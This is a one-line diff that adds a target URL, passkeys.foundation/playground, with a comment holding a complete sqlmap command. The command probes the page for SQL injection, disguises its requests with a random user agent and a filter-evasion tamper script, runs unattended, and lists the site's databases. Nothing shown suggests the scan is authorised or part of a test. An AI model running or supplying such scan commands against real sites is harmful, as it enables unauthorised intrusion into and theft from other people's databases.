@@ -1,0 +1,1 @@
+https://passkeys.foundation/playground (GET)  # sqlmap.py -u https://passkeys.foundation/playground --random-agent --tamper=space2comment --level=2 --batch --dbs
